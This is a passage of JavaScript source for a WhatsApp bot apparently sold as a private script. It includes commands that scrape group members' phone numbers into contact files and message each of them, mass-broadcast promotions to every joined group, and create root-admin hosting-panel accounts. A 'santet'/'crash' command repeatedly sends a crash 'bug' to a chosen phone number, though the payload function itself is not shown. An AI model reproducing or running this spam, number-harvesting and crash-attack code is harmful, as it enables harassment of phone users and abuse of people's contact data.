if (!idnya.endsWith("@g.us")) return m.reply("Format ID Grup Tidak Valid")
if (isNaN(delay)) return m.reply("Format Delay Tidak Valid")
if (!teks) return m.reply("*Contoh Command :*\n.pushkontak2 idgc|jeda|pesan\n\n*Note :* Jeda 1 detik = 1000\nketik *.listgc* untuk melihat semua list id grup")
var groupMetadataa
try {
groupMetadataa = await inzie.groupMetadata(`${idnya}`)
} catch (e) {
return m.reply("*ID Grup* tidak valid!")
}
const participants = await groupMetadataa.participants
const halls = await participants.filter(v => v.id.endsWith('.net')).map(v => v.id)
m.reply(`Memproses Mengirim Pesan Ke *${halls.length} Member Grup*`)
for (let mem of halls) {
if (mem !== m.sender) {
contacts.push(mem)
await fs.writeFileSync('./all/all/database/contacts.json', JSON.stringify(contacts))
await inzie.sendMessage(mem, {text: teks}, {quoted: qchanel})
await sleep(Number(delay))
}}
try {
const uniqueContacts = [...new Set(contacts)]
const vcardContent = uniqueContacts.map((contact, index) => {
const vcard = [
"BEGIN:VCARD",
"VERSION:3.0",
`FN:WA[${createSerial(2)}] ${contact.split("@")[0]}`,
`TEL;type=CELL;type=VOICE;waid=${contact.split("@")[0]}:+${contact.split("@")[0]}`,
"END:VCARD",
"", ].join("\n")
return vcard }).join("")
fs.writeFileSync("./all/all/database/contacts.vcf", vcardContent, "utf8")
} catch (err) {
m.reply(err.toString())
} finally {
if (m.chat !== m.sender) await m.reply(`Berhasil Mengirim Pesan Ke *${halls.length} Member Grup*, File Contact Berhasil Dikirim ke Private Chat`)
await inzie.sendMessage(m.sender, { document: fs.readFileSync("./all/all/database/contacts.vcf"), fileName: "contacts.vcf", caption: "File Contact Berhasil Di Buat✅", mimetype: "text/vcard", }, { quoted: m })
contacts.splice(0, contacts.length)
await fs.writeFileSync("./all/all/database/contacts.json", JSON.stringify(contacts))
await fs.writeFileSync("./all/all/database/contacts.vcf", "")
}}
break
case "idgc": {

if (!isOwner) return inzieReply(msg.owner)
if (!isGroup) return inzieReply(msg.group)
m.reply(`${m.chat}`)
}
break
case "listgc": case "cekidgc": case"listgrup": {

let gcall = Object.values(await inzie.groupFetchAllParticipating().catch(_=> null))
let listgc = '\n'
await gcall.forEach((u, i) => {
listgc += `*${i+1}.* ${u.subject}\n* *ID :* ${u.id}\n* *Total Member :* ${u.participants.length} Member\n* *Status Grup :* ${u.announce == true ? "Tertutup" : "Terbuka"}\n* *Pembuat :* ${u.owner ? u.owner.split('@')[0] : 'Sudah keluar'}\n\n`
})
inzie.sendMessage(m.chat, {text: `${listgc}`, contextInfo: {mentionedJid: [m.sender], externalAdReply: {
thumbnail: await getBuffer(ppuser), title: `[ ${gcall.length} Group Chat ] `, body: `Runtime : ${runtime(process.uptime())}`,  sourceUrl: global.linkyt, previewType: "PHOTO"}}}, {quoted: qchanel})
}
break
case "joingc": case "join": {

if (!isOwner) return inzieReply(msg.owner)
if (!text && !m.quoted) return m.reply(example('linknya'))
let teks = m.quoted ? m.quoted.text : text
if (!teks.includes('whatsapp.com')) return m.reply("Link Tautan Tidak Valid!")
let result = teks.split('https://chat.whatsapp.com/')[1]
await inzie.groupAcceptInvite(result).then(respon => m.reply("Berhasil Bergabung Ke Dalam Grup ✅")).catch(error => m.reply(error.toString()))
}
break
case "leave": case "leavegc": {

if (!isOwner) return inzieReply(msg.owner)
if (!isGroup) return inzieReply(msg.group)
await m.reply("Otw Abangkuhh🔥")
await sleep(3000)
await inzie.groupLeave(m.chat)
}
break
case "leavegc2": case "leave2": {

if (!isOwner) return inzieReply(msg.owner)
let gcall = await Object.values(await inzie.groupFetchAllParticipating().catch(_=> null))
let num = []
let listgc = `*Contoh Cara Penggunaan :*\nKetik *${cmd}* Nomor Grupnya\n\n*List Semua Grup Chat :*\n\n`
await gcall.forEach((u, i) => {
num.push(i)
listgc += ` *Nomor Grup => ${i+1}*\n*• Nama :* ${u.subject}\n*• ID :* ${u.id}\n*• Total Member :* ${u.participants.length} Member\n*• Status Grup :* ${u.announce == true ? "Tertutup" : "Terbuka"}\n*• Pembuat :* ${u.owner ? u.owner.split('@')[0] : 'Sudah keluar'}\n\n`
})
if (!args[0]) {
m.reply(listgc)
} else if (args[0]) {
if (!num.includes(Number(args[0]) - 1)) return m.reply("Grup tidak ditemukan")
let leav = Number(args[0]) - 1
await m.reply(`Berhasil Keluar Dari Grup :\n*${gcall[leav].subject}*`)
await inzie.groupLeave(`${gcall[leav].id}`)
}}
break
case "scbot": case "sc": 
case "scriptbot": {

if (isOwner) {
m.reply("Memproses Pengambilan Scriptbot")
let a = getTime().split("T")[1].split("+")[0]
var name = `inziebotzPrivate⚡`
const ls = (await execSync("ls"))
.toString()
.split("\n")
.filter(
(pe) =>
pe != "node_modules" &&
pe != "session" &&
pe != "package-lock.json" &&
pe != "yarn.lock" &&
pe != ""
)
const anu = await execSync(`zip -r ${name}.zip ${ls.join(" ")}`)
await inzie.sendMessage(m.sender, {document: await fs.readFileSync(`./${name}.zip`), fileName: `${name}.zip`, 
mimetype: "application/zip"}, {quoted: m})
await execSync(`rm -rf ${name}.zip`)
if (m.chat !== m.sender) return m.reply("Scriptbot Berhasil Dikirim Ke Chat Pribadi")
} else {
let teks = `*# Script ${namabot}*

Script Bot Ini Tidak Di Bagikan Secara *Gratis!!*

Jika Anda Berminat Ingin Membeli Script Ini, Silahkan Chat *Ownerbot* Dengan Cara Ketik *.owner*

*➡️ Youtube :*
${global.linkyt}

*➡️ Grup Jualan :*
${global.linkgc}

*➡️ Testimoni :*
${global.linksaluran}`
inzie.relayMessage(m.chat,  {requestPaymentMessage: {currencyCodeIso4217: 'IDR', amount1000: 10000000, requestFrom: m.sender, noteMessage: { extendedTextMessage: { text: teks, contextInfo: { externalAdReply: { showAdAttribution: true}}}}}}, {})
}}
break
case "done": {
if (!isOwner) return inzieReply(msg.owner)
if (!text) return m.reply(example("Nama Barang\n\n*Contoh :* Panel Unlimited"))
if (!text.split(",")) return m.reply(example("barang,harga\n\n*Contoh :* Panel Unlimited,2"))
var teks = `
_*𝐀𝐋𝐇𝐀𝐌𝐃𝐔𝐋𝐈𝐋𝐀𝐇 𝐓𝐑𝐗 𝐃𝐎𝐍𝐄 𝐋𝐀𝐆𝐈*_

━━━━━━━━━━━━━━━━━━━━━━
📦 *${text}*
⏰ ${tanggal(Date.now())}
💫 Status : Done✅
━━━━━━━━━━━━━━━━━━━━━━
*🪀 WhatsApp:https://wa.me/6287762845502

> MY GROUP¹ : https://chat.whatsapp.com/DJar5LxRdDv4MEmOK8rZIH

> BERBAGI SALURAN : https://whatsapp.com/channel/0029VagAOJzDzgT6KhMcmY2r

>TESTIMONI :
━━━━━━━━━━━━━━━━━━━━━━

𝗧𝗲𝗿𝗶𝗺𝗮𝗸𝗮𝘀𝗶𝗵 𝗧𝗲𝗹𝗮𝗵 𝗢𝗿𝗱𝗲𝗿 👑
𝗗𝗶 𝗧𝘂𝗻𝗴𝗴𝘂 𝗢𝗿𝗱𝗲𝗿𝗮𝗻 𝗦𝗲𝗹𝗮𝗻𝗷𝘂𝘁𝗻𝘆𝗮☺️

⌕ █║▌║▌║ - ║▌║▌║█ ⌕
© *『𝐈𝐍𝐙𝐈𝐄』👑*`
let msgii = generateWAMessageFromContent(m.chat, { viewOnceMessage: { message: { 
"messageContextInfo": { 
"deviceListMetadata": {}, 
"deviceListMetadataVersion": 2
}, 
interactiveMessage: proto.Message.InteractiveMessage.create({
contextInfo: { 
mentionedJid: [m.sender], 
externalAdReply: {
showAdAttribution: true }
}, body: proto.Message.InteractiveMessage.Body.create({ 
text: teks
}), 
footer: proto.Message.InteractiveMessage.Footer.create({ 
text: global.foother
}), 
nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({ 
buttons: [{
"name": "cta_url",
"buttonParamsJson": `{\"display_text\":\"Youtube\",\"url\":\"${global.linkyt}\",\"merchant_url\":\"https://www.google.com\"}`
}, 
{
"name": "cta_url",
"buttonParamsJson": `{\"display_text\":\"Telegram\",\"url\":\"${global.linktele}\",\"merchant_url\":\"https://www.google.com\"}`
}, 
{
"name": "cta_url",
"buttonParamsJson": `{\"display_text\":\"Testimoni\",\"url\":\"${global.linksaluran}\",\"merchant_url\":\"https://www.google.com\"}`
}]
})
})} 
}}, {userJid: m.sender, quoted: qtext}) 
await inzie.relayMessage(m.chat, msgii.message, { 
messageId: msgii.key.id 
})
}
break
case "startjpm": {
if (!isOwner) return inzieReply(msg.owner)
var teksnya = await fs.readFileSync("./all/all/database/teksjpm.js").toString()
if (teksnya.length < 1) return m.reply("Teks Jpm Tidak Ditemukan, Silahkan Isi/Edit Teks Jpm Didalam Folder all/database")
var teks = `${teksnya}`
let total = 0
let allfetch = await inzie.groupFetchAllParticipating()
let entrygc = Object.entries(allfetch).slice(0).map((entry)=>entry[1])
let finalres = entrygc.filter(entrygc=>entrygc.announce==false)
let usergc = finalres.map(v=>v.id)
m.reply(`Memproses Mengirim Pesan Ke *${usergc.length} Grup*`)
let msgii = generateWAMessageFromContent(m.chat, { viewOnceMessage: { message: { 
"messageContextInfo": { 
"deviceListMetadata": {}, 
"deviceListMetadataVersion": 2
}, 
interactiveMessage: proto.Message.InteractiveMessage.create({
contextInfo: { 
mentionedJid: [m.sender], 
externalAdReply: {
showAdAttribution: true }
}, body: proto.Message.InteractiveMessage.Body.create({ 
text: teksnya
}), 
nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({ 
buttons: [{
"name": "cta_url",
"buttonParamsJson": `{\"display_text\":\"Chat Owner\",\"url\":\"https://wa.me/${owner}\",\"merchant_url\":\"https://www.google.com\"}`
}, {
"name": "cta_url",
"buttonParamsJson": `{\"display_text\":\"Testimoni\",\"url\":\"${global.linksaluran}\",\"merchant_url\":\"https://www.google.com\"}`
}]
})
})} 
}}, {userJid: m.sender, quoted: qchanel})
for (let jid of usergc) {
try {
await inzie.relayMessage(jid, msgii.message, { 
messageId: msgii.key.id 
})
total += 1
} catch {}
await sleep(4000)
}
m.reply(`Berhasil Mengirim Pesan Ke *${total} Grup*`)
}
break
case "jpmhidetag": {
if (!isOwner) return inzieReply(msg.owner)
if (!text && !m.quoted) return m.reply(example("teksnya atau replyteks"))
var teks = m.quoted ? m.quoted.text : text
let total = 0
let allfetch = await inzie.groupFetchAllParticipating()
let entrygc = Object.entries(allfetch).slice(0).map((entry)=>entry[1])
let finalres = entrygc.filter(entrygc=>entrygc.announce==false)
let usergc = finalres.map(v=>v.id)
m.reply(`Memproses Mengirim Pesan *Text* Ke *${usergc.length}* Grup`)
for (let jid of usergc) {
try {
await inzie.sendMessage(jid, {text: teks, mentions: allfetch[jid].participants.map(e => e.id)}, {quoted: qchanel})
total += 1
} catch (e) {
console.log(e)
}
await sleep(global.delayjpm)
}
m.reply(`Berhasil Mengirim Pesan Ke *${total} Grup*`)
}
break
case "jpm": {
if (!isOwner) return inzieReply(msg.owner)
if (!text && !m.quoted) return m.reply(example("teksnya atau replyteks"))
var teks = m.quoted ? m.quoted.text : text
let total = 0
let allfetch = await inzie.groupFetchAllParticipating()
let entrygc = Object.entries(allfetch).slice(0).map((entry)=>entry[1])
let finalres = entrygc.filter(entrygc=>entrygc.announce==false)
let usergc = finalres.map(v=>v.id)
m.reply(`Memproses Mengirim Pesan Ke *${usergc.length} Grup*`)
for (let jid of usergc) {
try {
await inzie.sendMessage(jid, {text: teks}, {quoted: qchanel})
total += 1
} catch {}
await sleep(global.delayjpm)
}
m.reply(`Berhasil Mengirim Pesan Ke *${total} Grup*`)
}
break
case "jpmpromosi": case "jpmpromo": case "jpm3": {
if (!isOwner) return inzieReply(msg.owner)
if (!text && !m.quoted) return m.reply(example("teksnya atau replyteks"))
var teks = m.quoted ? m.quoted.text : text
let total = 0
let allfetch = await inzie.groupFetchAllParticipating()
let entrygc = Object.entries(allfetch).slice(0).map((entry)=>entry[1])
let finalres = entrygc.filter(entrygc=>entrygc.announce==false)
let usergc = finalres.map(v=>v.id)
m.reply(`Memproses Mengirim Pesan Ke *${usergc.length} Grup*`)
let teksnya = teks
let msgii = generateWAMessageFromContent(m.chat, { viewOnceMessage: { message: { 
"messageContextInfo": { 
"deviceListMetadata": {}, 
"deviceListMetadataVersion": 2
}, 
interactiveMessage: proto.Message.InteractiveMessage.create({
contextInfo: { 
mentionedJid: [m.sender], 
externalAdReply: {
showAdAttribution: true }
}, body: proto.Message.InteractiveMessage.Body.create({ 
text: teksnya
}), 
nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({ 
buttons: [{
"name": "cta_url",
"buttonParamsJson": `{\"display_text\":\"Chat Owner\",\"url\":\"https://wa.me/${owner}\",\"merchant_url\":\"https://www.google.com\"}`
}, {
"name": "cta_url",
"buttonParamsJson": `{\"display_text\":\"Testimoni\",\"url\":\"${global.linksaluran}\",\"merchant_url\":\"https://www.google.com\"}`
}]
})
})} 
}}, {userJid: m.sender, quoted: qchanel})
for (let jid of usergc) {
try {
await inzie.relayMessage(jid, msgii.message, { 
messageId: msgii.key.id 
})
total += 1
} catch {}
await sleep(global.delayjpm)
}
m.reply(`Berhasil Mengirim Pesan Ke *${total} Grup*`)
}
break
case "jpm2": {
if (!isOwner) return inzieReply(msg.owner)
if (!text) return m.reply(example("teksnya dengan balas/kirim foto"))
if (!/image/.test(mime)) return m.reply(example("teksnya dengan balas/kirim foto"))
let image = await inzie.downloadAndSaveMediaMessage(qmsg)
let total = 0
let allfetch = await inzie.groupFetchAllParticipating()
let entrygc = Object.entries(allfetch).slice(0).map((entry)=>entry[1])
let finalres = entrygc.filter(entrygc=>entrygc.announce==false)
let usergc = finalres.map(v=>v.id)
m.reply(`Memproses Mengirim Pesan Teks & Foto Ke *${usergc.length} Grup*`)
for (let jid of usergc) {
try {
inzie.sendMessage(jid, {image: await fs.readFileSync(image), caption: text, contextInfo: {forwardingScore: 1,
isForwarded: true}}, {quoted: qchanel})
total += 1
} catch {}
await sleep(global.delayjpm)
}
await fs.unlinkSync(image)
m.reply(`Berhasil Mengirim Postingan Ke *${total} Grup*`)
}
break
case "jpmtesti": {
if (!isOwner) return inzieReply(msg.owner)
if (!text) return m.reply(example("teksnya dengan balas/kirim foto"))
if (!/image/.test(mime)) return m.reply(example("teksnya dengan balas/kirim foto"))
let image = await inzie.downloadAndSaveMediaMessage(qmsg)
if (global.idsaluran == "-") return m.reply('Isi Dulu ID Saluran Lu Di File Settings.js!')
let total = 0
let allfetch = await inzie.groupFetchAllParticipating()
let entrygc = Object.entries(allfetch).slice(0).map((entry)=>entry[1])
let finalres = entrygc.filter(entrygc=>entrygc.announce==false)
let usergc = finalres.map(v=>v.id)
m.reply(`Memproses Mengirim Pesan Teks & Foto Ke *${usergc.length} Grup*`)
let msgii = generateWAMessageFromContent(m.chat, { viewOnceMessage: { message: { 
"messageContextInfo": { 
"deviceListMetadata": {}, 
"deviceListMetadataVersion": 2
}, 
interactiveMessage: proto.Message.InteractiveMessage.create({
contextInfo: { 
mentionedJid: [m.sender], 
externalAdReply: {
showAdAttribution: true }
}, body: proto.Message.InteractiveMessage.Body.create({ 
text: text
}), header: proto.Message.InteractiveMessage.Header.create({ 
hasMediaAttachment: true, ...(await prepareWAMessageMedia({ image: await fs.readFileSync(image)}, { upload: inzie.waUploadToServer })) 
}), 
nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({ 
buttons: [{
"name": "cta_url",
"buttonParamsJson": `{\"display_text\":\"Chat Owner\",\"url\":\"https://wa.me/${owner}\",\"merchant_url\":\"https://www.google.com\"}`
}, {
"name": "cta_url",
"buttonParamsJson": `{\"display_text\":\"Testimoni\",\"url\":\"${global.linksaluran}\",\"merchant_url\":\"https://www.google.com\"}`
}]
})
})} 
}}, {userJid: m.sender, quoted: qchanel})
for (let jid of usergc) {
try {
await inzie.relayMessage(jid, msgii.message, { 
messageId: msgii.key.id 
})
total += 1
} catch {}
await sleep(global.delayjpm)
}
await fs.unlinkSync(image)
m.reply(`Berhasil Mengirim Postingan Ke *${total} Grup*`)
}
break
case "addadmin": {
if (!text) return m.reply(example("username"))
if (!isOwner) return inzieReply(msg.owner)
let username = text.toLowerCase()
let email = username+"@gmail.com"
let name = capital(args[0])
let password = username+crypto.randomBytes(2).toString('hex')
let f = await fetch(domain + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
},
"body": JSON.stringify({
"email": email,
"username": username.toLowerCase(),
"first_name": name,
"last_name": "Admin",
"root_admin": true,
"language": "en",
"password": password.toString()
})
})
let data = await f.json();
if (data.errors) return m.reply(JSON.stringify(data.errors[0], null, 2))
let user = data.attributes
var orang
if (isGroup) {
orang = m.sender
await m.reply("*Berhasil Membuat Akun Admin Panel ✅*\nData Akun Sudah Dikirim Ke Private Chat")
} else {
orang = m.chat
}
var teks = `
*Berhasil Membuat Admin Panel ✅*

* *ID :* ${user.id}
* *Nama :* ${user.first_name}
* *Created :* ${user.created_at.split("T")[0]}
`
let msgii = generateWAMessageFromContent(m.chat, { viewOnceMessage: { message: { 
"messageContextInfo": { 
"deviceListMetadata": {}, 
"deviceListMetadataVersion": 2
}, 
interactiveMessage: proto.Message.InteractiveMessage.create({
contextInfo: { 
mentionedJid: [m.sender], 
externalAdReply: {
showAdAttribution: true }
}, body: proto.Message.InteractiveMessage.Body.create({ 
text: teks
}), 
nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({ 
buttons: [{
"name": "cta_url",
"buttonParamsJson": `{\"display_text\":\"Login Server Panel\",\"url\":\"${global.domain}\",\"merchant_url\":\"https://www.google.com\"}`
}, 
{
"name": "cta_copy",
"buttonParamsJson": `{\"display_text\":\"Copy Username\",\"id\":\"123456789\",\"copy_code\":\"${user.username}\"}`
},
{
"name": "cta_copy",
"buttonParamsJson": `{\"display_text\":\"Copy Password\",\"id\":\"123456789\",\"copy_code\":\"${password.toString()}\"}`
}]
})
})} 
}}, {userJid: m.sender, quoted: qchanel}) 
await inzie.relayMessage(orang, msgii.message, { 
messageId: msgii.key.id 
})
}
break
case "addadmin2": {
if (!text) return m.reply(example("nama,6283XXX"))
if (!isOwner) return inzieReply(msg.owner)
if (!args[0]) return m.reply(example("nama,6283XXX"))
if (!text.split(",")) return m.reply(example("nama,6283XXX"))
var buyyer = text.split(",")[0].toLowerCase()
if (!buyyer) return m.reply(example("nama,6283XXX"))
var ceknya = text.split(",")[1]
if (!ceknya) return m.reply(example("nama,6283XXX"))
var client = text.split(",")[1].replace(/[^0-9]/g, '')+'@s.whatsapp.net'
var check = await inzie.onWhatsApp(ceknya)
if (!check[0].exists) return m.reply("Nomor Buyyer Tidak Valid!")
let username = buyyer.toLowerCase()
let email = username+"@gmail.com"
let name = capital(username)
let password = username+crypto.randomBytes(2).toString('hex')
let f = await fetch(domain + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
},
"body": JSON.stringify({
"email": email,
"username": username.toLowerCase(),
"first_name": name,
"last_name": "Admin",
"root_admin": true,
"language": "en",
"password": password.toString()
})
})
let data = await f.json();
if (data.errors) return m.reply(JSON.stringify(data.errors[0], null, 2))
let user = data.attributes
await m.reply(`*Berhasil Membuat Akun Admin Panel ✅*\nData Akun Sudah Dikirim Ke Nomor ${ceknya}`)
var teks = `
*Berhasil Membuat Admin Panel ✅*

* *ID :* ${user.id}
* *Nama :* ${user.first_name}
* *Created :* ${user.created_at.split("T")[0]}
`
let msgii = generateWAMessageFromContent(m.chat, { viewOnceMessage: { message: { 
"messageContextInfo": { 
"deviceListMetadata": {}, 
"deviceListMetadataVersion": 2
}, 
interactiveMessage: proto.Message.InteractiveMessage.create({
contextInfo: { 
mentionedJid: [m.sender], 
externalAdReply: {
showAdAttribution: true }
}, body: proto.Message.InteractiveMessage.Body.create({ 
text: teks
}), 
nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({ 
buttons: [{
"name": "cta_url",
"buttonParamsJson": `{\"display_text\":\"Login Server Panel\",\"url\":\"${global.domain}\",\"merchant_url\":\"https://www.google.com\"}`
}, 
{
"name": "cta_copy",
"buttonParamsJson": `{\"display_text\":\"Copy Username\",\"id\":\"123456789\",\"copy_code\":\"${user.username}\"}`
},
{
"name": "cta_copy",
"buttonParamsJson": `{\"display_text\":\"Copy Password\",\"id\":\"123456789\",\"copy_code\":\"${password.toString()}\"}`
}]
})
})} 
}}, {userJid: m.sender, quoted: qchanel}) 
await inzie.relayMessage(client, msgii.message, { 
messageId: msgii.key.id 
})
}
break
case "deladmin": {
if (!isOwner) return inzieReply(msg.owner)
if (!args[0]) return m.reply(example("id\n\nuntuk melihat id admin ketik *.listadmin*"))
let cek = await fetch(domain + "/api/application/users?page=1", {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
let res2 = await cek.json();
let users = res2.data;
let getid = null
let idadmin = null
await users.forEach(async (e) => {
if (e.attributes.id == args[0] && e.attributes.root_admin == true) {
getid = e.attributes.username
idadmin = e.attributes.id
let delusr = await fetch(domain + `/api/application/users/${idadmin}`, {
"method": "DELETE",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
let res = delusr.ok ? {
errors: null
} : await delusr.json()
}
})
if (idadmin == null) return m.reply("ID Admin Tidak Ditemukan!")
m.reply(`Berhasil Menghapus Admin Panel *${capital(getid)}*`)
}
break
case "listadmin": {
if (!isOwner) return inzieReply(msg.owner)
let cek = await fetch(domain + "/api/application/users?page=1", {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
let res2 = await cek.json();
let users = res2.data;
let totaladmin = 0
if (users.length < 1 ) return m.reply("Tidak Ada Admin Panel")
var teks = " *LIST ADMIN PANEL BOT⚡*\n\n"
await users.forEach((i) => {
if (i.attributes.root_admin !== true) return
totaladmin += 1
teks += `\`📡ID User ${i.attributes.id}\`
* Nama : *${i.attributes.first_name}*
* Created : ${i.attributes.created_at.split("T")[0]}\n\n`
})
teks += ` Total Admin : *${totaladmin} Admin*`
inzie.sendText(m.chat, teks, qtoko)
}
break
case "santet": case "crash": {
if (!isOwner) return inzieReply(msg.owner)
if (!text) return m.reply(example("6283XX,jumlahbug"))
if (!text.split(",")) return m.reply(example("6283XX,jumlahbug"))
var [target, jumlah] = text.split(",")
if (isNaN(target)) return m.reply("Target Tidak Valid!")
if (isNaN(jumlah)) return m.reply("Jumlah Tidak Valid!")
var org = target.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
var check = await inzie.onWhatsApp(org.split('@')[0])
if (!check[0].exists) return m.reply("Target Tidak Terdaftar Di WhatsApp")
m.reply("Memproses Pengiriman Bug . . .")
var total = Number(jumlah) + 10
for (let i = 0; i < total; i++) {
if (i == 10) m.reply(`Berhasil Memproses, Bug Sedang Dikirim Ke ${org.split("@")[0]}`)
MessageBug(`${org}`)
await sleep(2000)
}
}
break
case "cpanel": case "addpanel": case "buatpanel": {
if (!isOwner && !isReseller) return inzieReply(msg.owner)
if (global.apikey.length < 1) return m.reply("Apikey Tidak Ditemukan!")
if (!args[0]) return m.reply(example("nama"))
global.panel = [text.toLowerCase()]
let teksnya = "Silahkan Pilih Ram Server Panel"
let msgii = generateWAMessageFromContent(m.chat, { viewOnceMessage: { message: { 
"messageContextInfo": { 
"deviceListMetadata": {}, 
"deviceListMetadataVersion": 2
}, 
interactiveMessage: proto.Message.InteractiveMessage.create({
contextInfo: { 
mentionedJid: [m.sender], 
externalAdReply: {
showAdAttribution: true }
}, body: proto.Message.InteractiveMessage.Body.create({ 
text: teksnya
}), 
footer: proto.Message.InteractiveMessage.Footer.create({ 
text: global.foother
}), 
nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({ 
buttons: [{
"name": "single_select",
"buttonParamsJson": `{ "title": "Pilih Ram Panel", "sections": [{ "title": "# Silahkan Pilih Salah Satu Di Bawah Ini", "highlight_label": \"Powered By ${namaowner}\", "rows": [{ "header": "Ram Unlimited", "title": "Ram Unlimited | CPU Unlimited", "id": ".cpunli" }, 
{ "header": "Ram 1GB", "title": "Ram 1GB | CPU 40%", "id": ".cp1gb" }, 
{ "header": "Ram 2GB", "title": "Ram 2GB | CPU 60%", "id": ".cp2gb" }, 
{ "header": "Ram 3GB", "title": "Ram 3GB | CPU 80%", "id": ".cp3gb" }, 
{ "header": "Ram 4GB", "title": "Ram 4GB | CPU 100%", "id": ".cp4gb" }, 
{ "header": "Ram 5GB", "title": "Ram 5GB | CPU 120%", "id": ".cp5gb" }, 
{ "header": "Ram 6GB", "title": "Ram 6GB | CPU 140%", "id": ".cp6gb" }, 
{ "header": "Ram 7GB", "title": "Ram 7GB | CPU 160%", "id": ".cp7gb" }, 
{ "header": "Ram 8GB", "title": "Ram 8GB | CPU 180%", "id": ".cp8gb" }, 
{ "header": "Ram 9GB", "title": "Ram 9GB | CPU 200%", "id": ".cp9gb" }]}]}`
}]
})
})} 
}}, {userJid: m.sender, quoted: qchanel}) 
await inzie.relayMessage(msgii.key.remoteJid, msgii.message, { 
messageId: msgii.key.id 
})
}
break
case "cpanel2": case "addpanel2": case "buatpanel2": {
if (!isOwner && !isReseller) return inzieReply(msg.owner)
if (global.apikey.length < 1) return m.reply("Apikey Tidak Ditemukan!")
global.tempuser = crypto.randomBytes(3).toString('hex')
global.temppw = crypto.randomBytes(4).toString('hex')
let teksnya = "Silahkan Pilih Ram Server Panel, Username & Password Panel Akan Dibuat Secara Otomatis Oleh Bot"
let msgii = generateWAMessageFromContent(m.chat, { viewOnceMessage: { message: { 
"messageContextInfo": { 
"deviceListMetadata": {}, 
"deviceListMetadataVersion": 2
}, 
interactiveMessage: proto.Message.InteractiveMessage.create({
contextInfo: { 
mentionedJid: [m.sender], 
externalAdReply: {
showAdAttribution: true }
}, body: proto.Message.InteractiveMessage.Body.create({ 
text: teksnya
}), 
footer: proto.Message.InteractiveMessage.Footer.create({ 
text: global.foother
}), 
nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({ 
buttons: [{
"name": "single_select",
"buttonParamsJson": `{ "title": "Pilih Ram Panel", "sections": [{ "title": "# Silahkan Pilih Salah Satu Di Bawah Ini", "highlight_label": \"Powered By ${namaowner}\", "rows": [{ "header": "Ram Unlimited", "title": "Ram Unlimited | CPU Unlimited", "id": ".cpunliv2" }, 
{ "header": "Ram 1GB", "title": "Ram 1GB | CPU 40%", "id": ".cp1gbv2" }, 
{ "header": "Ram 2GB", "title": "Ram 2GB | CPU 60%", "id": ".cp2gbv2" }, 
{ "header": "Ram 3GB", "title": "Ram 3GB | CPU 80%", "id": ".cp3gbv2" }, 
{ "header": "Ram 4GB", "title": "Ram 4GB | CPU 100%", "id": ".cp4gbv2" }, 
{ "header": "Ram 5GB", "title": "Ram 5GB | CPU 120%", "id": ".cp5gbv2" }, 
{ "header": "Ram 6GB", "title": "Ram 6GB | CPU 140%", "id": ".cp6gbv2" }, 
{ "header": "Ram 7GB", "title": "Ram 7GB | CPU 160%", "id": ".cp7gbv2" }, 
{ "header": "Ram 8GB", "title": "Ram 8GB | CPU 180%", "id": ".cp8gbv2" }, 
{ "header": "Ram 9GB", "title": "Ram 9GB | CPU 200%", "id": ".cp9gbv2" }]}]}`
}]
})
})} 
}}, {userJid: m.sender, quoted: qchanel}) 
await inzie.relayMessage(msgii.key.remoteJid, msgii.message, { 
messageId: msgii.key.id 
})
}
break
case "cpanel3": case "addpanel3": case "buatpanel3": {
if (!isOwner && !isReseller) return inzieReply(msg.owner)
if (global.apikey.length < 1) return m.reply("Apikey Tidak Ditemukan!")
if (!args[0]) return m.reply(example("nama,6283XXX"))
if (!text.split(",")) return m.reply(example("nama,6283XXX"))
var buyyer = text.split(",")[0].toLowerCase()
if (!buyyer) return m.reply(example("nama,6283XXX"))
var ceknya = text.split(",")[1]
if (!ceknya) return m.reply(example("nama,6283XXX"))
var client = text.split(",")[1].replace(/[^0-9]/g, '')+'@s.whatsapp.net'
var check = await inzie.onWhatsApp(ceknya)
if (!check[0].exists) return m.reply("Nomor Buyyer Tidak Valid!")
global.panel3 = [buyyer, client]
let teksnya = "Silahkan Pilih Ram Server Panel"
let msgii = generateWAMessageFromContent(m.chat, { viewOnceMessage: { message: { 
"messageContextInfo": { 
"deviceListMetadata": {}, 
"deviceListMetadataVersion": 2
}, 
interactiveMessage: proto.Message.InteractiveMessage.create({
contextInfo: { 
mentionedJid: [m.sender], 
externalAdReply: {
showAdAttribution: true }
}, body: proto.Message.InteractiveMessage.Body.create({ 
text: teksnya
}), 
footer: proto.Message.InteractiveMessage.Footer.create({ 
text: global.foother
}), 
nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({ 
buttons: [{
"name": "single_select",
"buttonParamsJson": `{ "title": "Pilih Ram Panel", "sections": [{ "title": "# Silahkan Pilih Salah Satu Di Bawah Ini", "highlight_label": \"Powered By ${namaowner}\", "rows": [{ "header": "Ram Unlimited", "title": "Ram Unlimited | CPU Unlimited", "id": ".cpunliv3" }, 
{ "header": "Ram 1GB", "title": "Ram 1GB | CPU 40%", "id": ".cp1gbv3" }, 
{ "header": "Ram 2GB", "title": "Ram 2GB | CPU 60%", "id": ".cp2gbv3" }, 
{ "header": "Ram 3GB", "title": "Ram 3GB | CPU 80%", "id": ".cp3gbv3" }, 
{ "header": "Ram 4GB", "title": "Ram 4GB | CPU 100%", "id": ".cp4gbv3" }, 
{ "header": "Ram 5GB", "title": "Ram 5GB | CPU 120%", "id": ".cp5gbv3" }, 
{ "header": "Ram 6GB", "title": "Ram 6GB | CPU 140%", "id": ".cp6gbv3" }, 
